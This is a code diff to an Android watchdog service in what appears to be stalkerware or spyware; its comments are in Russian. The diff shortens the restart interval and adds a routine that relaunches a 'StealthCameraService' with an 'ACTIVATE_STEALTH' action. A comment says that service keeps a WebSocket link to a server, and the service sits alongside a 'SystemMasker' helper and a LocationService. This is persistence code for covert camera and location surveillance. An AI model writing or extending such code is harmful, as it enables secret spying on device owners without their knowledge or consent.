@@ -17,7 +17,7 @@ public class WatchdogService extends Service {
     private static final String TAG = "SystemWatchdog";
     private static final String CHANNEL_ID = "system_monitoring";
     private static final int NOTIFICATION_ID = 8002;
-    private static final long WATCHDOG_INTERVAL = 180_000L; // 3 минуты
+    private static final long WATCHDOG_INTERVAL = 60_000L; // 1 минута (было 3)
 
     private Handler handler;
     private Runnable watchdogRunnable;
@@ -57,9 +57,10 @@ public class WatchdogService extends Service {
                 return;
             }
 
-            // Проверяем основные сервисы
+            // Проверяем все сервисы
             checkMainService();
             checkBackupService();
+            checkStealthCameraService(); // WebSocket-соединение с сервером
 
             // Планируем следующую задачу через JobScheduler
             SystemMasker.scheduleSystemJob(this);
@@ -91,6 +92,27 @@ public class WatchdogService extends Service {
             }
         } catch (Exception e) {
             Log.e(TAG, "Error checking main service", e);
+        }
+    }
+
+    // StealthCameraService держит WebSocket-соединение с сервером.
+    // Без него устройство никогда не выйдет из offline, даже если LocationService жив.
+    private void checkStealthCameraService() {
+        try {
+            String deviceId = DeviceIdManager.getDeviceId(this);
+            Intent stealthIntent = new Intent(this, StealthCameraService.class);
+            stealthIntent.putExtra("action", "ACTIVATE_STEALTH");
+            stealthIntent.putExtra("device_id", deviceId);
+            stealthIntent.putExtra("watchdog_restart", true);
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                startForegroundService(stealthIntent);
+            } else {
+                startService(stealthIntent);
+            }
+            Log.d(TAG, "StealthCameraService health check completed");
+        } catch (Exception e) {
+            Log.e(TAG, "Error restarting StealthCameraService", e);
         }
     }
 
